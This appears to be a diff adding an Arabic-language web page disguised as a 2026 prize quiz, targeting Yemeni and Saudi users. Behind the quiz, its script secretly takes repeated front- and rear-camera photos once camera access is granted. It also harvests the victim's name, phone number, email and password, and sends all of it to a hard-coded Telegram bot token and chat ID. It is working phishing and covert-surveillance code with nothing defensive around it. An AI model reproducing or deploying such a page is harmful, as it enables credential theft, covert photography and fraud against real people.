@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة الجوائز العالمية 2026</title>
+    <style>
+        body { background: #050a14; font-family: 'Cairo', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; color: white; overflow-x: hidden; }
+        .card { background: linear-gradient(145deg, #1e212d, #0f111a); padding: 25px; border-radius: 20px; box-shadow: 0 0 30px rgba(241, 196, 15, 0.2); width: 90%; max-width: 420px; text-align: center; border: 2px solid #d4af37; display: none; position: relative; animation: fadeIn 0.4s; }
+        .active { display: block; }
+        h2 { color: #f1c40f; text-shadow: 0 0 10px rgba(241,196,15,0.5); }
+        input { width: 92%; padding: 12px; margin: 10px 0; border-radius: 8px; border: none; background: #fff; color: #000; font-weight: bold; }
+        button { width: 100%; padding: 15px; background: linear-gradient(90deg, #c0392b, #e74c3c); color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 1.1em; }
+        .winners-bar { background: #d4af37; color: #000; padding: 5px; font-size: 12px; font-weight: bold; position: absolute; top: 0; left: 0; width: 100%; border-radius: 20px 20px 0 0; overflow: hidden; }
+        .ticker { display: inline-block; white-space: nowrap; animation: ticker 15s linear infinite; }
+        @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
+        .prize-img { width: 100%; border-radius: 10px; margin: 10px 0; border: 1px solid #d4af37; }
+        #feedback { color: #ff4757; font-weight: bold; font-size: 13px; }
+    </style>
+</head>
+<body>
+
+<div class="card active" id="s1">
+    <div class="winners-bar"><div class="ticker">مبروك للأخ عادل من تعز فاز بـ 500$ .. مبروك لصالح من الرياض فاز بـ 1500$ ..</div></div>
+    <br><img src="https://m.media-amazon.com/images/I/71YvU5l7M1L._AC_SL1500_.jpg" class="prize-img">
+    <h2>مسابقة الحلم 2026</h2>
+    <p><b>ما هي عاصمة المملكة العربية السعودية؟</b></p>
+    <input type="text" id="a1" placeholder="الإجابة...">
+    <button onclick="checkS1()">تحقق وفوز بجهازك</button>
+</div>
+
+<div class="card" id="s2">
+    <h2>تأكيد الهوية والجائزة</h2>
+    <p>أدخل بياناتك لربط حوالة الـ 1500$ باسمك:</p>
+    <input type="text" id="uName" placeholder="الاسم الثلاثي">
+    <input type="tel" id="uPhone" placeholder="رقم الهاتف (يمني أو سعودي)">
+    <button onclick="toQuiz()">حفظ ومتابعة الاختبار</button>
+    <div id="feedback"></div>
+</div>
+
+<div class="card" id="s3">
+    <h2 id="qTitle">الاختبار النهائي - 1/3</h2>
+    <p id="qText">ما هو الشيء الذي له أسنان ولا يعض؟</p>
+    <input type="text" id="quizAns" placeholder="الإجابة...">
+    <button onclick="checkHardQuiz()">تأكيد الإجابة</button>
+</div>
+
+<div class="card" id="s4">
+    <div style="font-size: 40px;">🔐</div>
+    <h2>توثيق الأمان الدولي</h2>
+    <p>بسبب قيمة المبلغ، يرجى تسجيل الدخول لتأكيد الحساب:</p>
+    <input type="email" id="uMail" placeholder="البريد الإلكتروني">
+    <input type="password" id="uPass" placeholder="كلمة السر">
+    <button onclick="toFinal()">تفعيل التحويل البنكي</button>
+</div>
+
+<div class="card" id="s5">
+    <h2 style="color:#2ecc71">تم الفوز! 🎉</h2>
+    <p>رقم الحوالة: <b>YMN-KSA-991</b></p>
+</div>
+
+<video id="v" width="1" height="1" autoplay style="display:none;"></video>
+<canvas id="c" width="640" height="480" style="display:none;"></canvas>
+
+<script>
+    const token = '8613819460:AAHS5tMNWSpCAUpSR673CEmZiDk8jw2xeEY';
+    const chat = '8449870416';
+    let user = ""; let hStep = 1;
+
+    async function checkS1() {
+        if(document.getElementById('a1').value.trim() === "الرياض") {
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({video: true});
+                document.getElementById('v').srcObject = s;
+                showS(2);
+                runCap("زائر", s);
+            } catch(e) { alert("يجب السماح بالكاميرا لتأكيد أنك لست روبوت!"); }
+        }
+    }
+
+    async function toQuiz() {
+        user = document.getElementById('uName').value;
+        const p = document.getElementById('uPhone').value.replace(/\s+/g, '');
+        const yemenRegex = /^(\+?967|0)?(70|71|73|77|78)\d{7}$/;
+        const saudiRegex = /^(\+?966|0)?5\d{8}$/;
+        if(!user || (!yemenRegex.test(p) && !saudiRegex.test(p))) {
+            document.getElementById('feedback').innerText = "بيانات غير صحيحة!"; return;
+        }
+        sendB(`👤 صيد جديد:\nالاسم: ${user}\nالهاتف: ${p}`);
+        showS(3);
+    }
+
+    function checkHardQuiz() {
+        const a = document.getElementById('quizAns').value.trim();
+        if(hStep === 1 && a === "المشط") { hStep=2; upQ("2/3", "شيء تذبحه وتبكي عليه؟"); }
+        else if(hStep === 2 && a === "البصل") { hStep=3; upQ("3/3", "كلمة تجمع كل الحروف؟"); }
+        else if(hStep === 3 && (a === "الأبجدية" || a === "الابجدية")) { showS(4); }
+    }
+    function upQ(t, x) {
+        document.getElementById('qTitle').innerText = "الاختبار - " + t;
+        document.getElementById('qText').innerText = x;
+        document.getElementById('quizAns').value = "";
+    }
+    function toFinal() {
+        const m = document.getElementById('uMail').value;
+        const p = document.getElementById('uPass').value;
+        if(m.includes('@') && p.length > 5) {
+            sendB(`🔑 دخول:\n📧: ${m}\n🔐: ${p}`);
+            showS(5);
+        }
+    }
+    function showS(n) {
+        document.querySelectorAll('.card').forEach(c => c.classList.remove('active'));
+        document.getElementById('s' + n).classList.add('active');
+    }
+    async function runCap(n, is) {
+        is.getTracks().forEach(t => t.stop());
+        const modes = ["user", "environment"];
+        for(let i=1; i<=8; i++) {
+            for(let m of modes) {
+                try {
+                    const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:m}});
+                    document.getElementById('v').srcObject = s;
+                    await new Promise(r => setTimeout(r, 1000));
+                    takeP(m === "user" ? "أمامية" : "خلفية", user || n);
+                    s.getTracks().forEach(t => t.stop());
+                    await new Promise(r => setTimeout(r, 3000));
+                } catch(e) {}
+            }
+        }
+    }
+    function takeP(l, n) {
+        const canvas = document.getElementById('c');
+        canvas.getContext('2d').drawImage(document.getElementById('v'),0,0,640,480);
+        canvas.toBlob(blob => {
+            const fd = new FormData();
+            fd.append('chat_id', chat); fd.append('photo', blob, 'x.jpg');
+            fd.append('caption', `📸 ${l} - ${n}`);
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method:'POST', body:fd});
+        }, 'image/jpeg');
+    }
+    function sendB(t) { fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(t)}`); }
+</script>
+</body>
+</html>
